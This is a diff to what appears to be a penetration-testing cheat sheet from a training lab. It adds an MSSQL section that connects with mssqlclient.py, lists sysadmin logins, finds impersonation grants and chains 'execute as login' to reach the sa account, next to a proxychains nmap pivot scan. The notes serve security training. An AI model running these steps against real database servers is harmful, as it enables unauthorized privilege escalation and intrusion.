@@ -242,6 +242,33 @@ Pivoting is finished
 
 #proxychains nmap -sV -sC -Pn 192.168.22.3(internal IP) 
 ____________________________________________________________________________________________________________________________________
+MSSQL DB User Impersonating to RCE
+----------------------------------
+#mssqlclient.py bob:password@demo.ine.local
+SQL > select @@version
+SQL > select loginname from syslogins where sysadmin = 1;
+
+sa (Sysadmin user is only sa user)
+
+To impersonate sa user with the name dbuser
+
+SQL > select distinct b.name from sys.server_permissions a INNER JOIN sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate';
+
+SQL > select system_user
+
+bob 
+
+Impersonate ( bob > dbuser > sa)
+
+SQL > execute as login = 'dbuser';
+SQL > execute as login = 'sa';
+
+SQL > select system_user
+
+sa (finally we got sa user)
+
+
+
 
 
 
